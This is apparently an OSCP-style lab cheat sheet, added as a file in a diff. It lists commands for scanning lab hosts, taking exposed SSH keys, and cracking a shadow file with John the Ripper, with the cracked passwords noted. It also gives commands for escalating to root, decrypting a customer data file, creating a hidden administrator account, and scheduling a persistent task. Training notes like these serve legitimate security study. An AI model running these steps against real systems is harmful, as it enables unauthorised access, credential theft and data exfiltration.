@@ -1,0 +1,100 @@
+OSCP commands part 3
+
+ Create local user (batch file):
+:@ECHO OFF
+NET USER DARIUS PASSWORD
+PAUSE
+NET USER VOILMOVE PASSWORD /ADD
+PAUSE
+NET LOCALGROUP "ADMINISTRATORS" VOILMOVE /ADD
+####################################
+
+nmap -n 192.168.2.1-255
+
+nmap -n -sV -sS -O 192.168.2.100
+
+nmap -n -sV -sS -O 192.168.2.101
+
+firefox 192.168.2.100
+##############
+
+./nikto.pl -host 192.168.2.101 -r ~pirrip/ -Display 124
+
+firefox 192.168.2.101/~pirrip/.ssh
+
+###########
+// Save both files
+
+mv /root/id_rsa /root/.ssh/id_rsa
+
+mv /root/id_rsa.pub /root/.ssh/id_rsa.pub
+
+chmod 000 /root/.ssh/id_rsa
+
+chmod 000 /root/.ssh/id_rsa.pub
+
+ssh pirrip@192.168.2.100
+// Yes
+
+#############
+//In BackTrack//
+
+scp pirrip@192.168.2.100:/root/.save/great_expectations.zip /root/
+
+unzip great_expectations.zip
+
+tar xf great_expectations.tar
+
+strings Jan08
+
+############
+cd tools/dictionary/
+
+cat common-1 common-2 common-3 common-4 wordlist.txt >> /root/passwords
+
+
+
+john
+
+./john --rules --wordlist=/root/passwords /root/shadow
+//Password: root:Complexity & ccofee:Diatomaceous
+
+ssh ccofee@192.168.1.110
+//Password: Diatomaceous
+
+#########
+
+ls -a
+
+cd ..
+
+ls -a
+
+cd root/
+
+ls -a
+
+cd .save/
+
+su
+//Password: Complexity
+
+cd .save/
+
+ls -a
+
+cat copy.sh
+
+openssl enc -d -aes-256-cbc -salt -in customer_account.csv.enc -out customer_account.csv -pass file:/etc/ssl/certs/pw
+
+ls -a
+
+cat customer_account.csv
+// GAME OVER
+
+################
+
+Persistence:
+
+Scheduling:
+schtasks /create /sc minute /mo 1 /tn "dumpTCP" /tr "C:\WINDOWS\System32\cmd.exe /C netstat -nap TCP>> c:\logTCP.txt" 
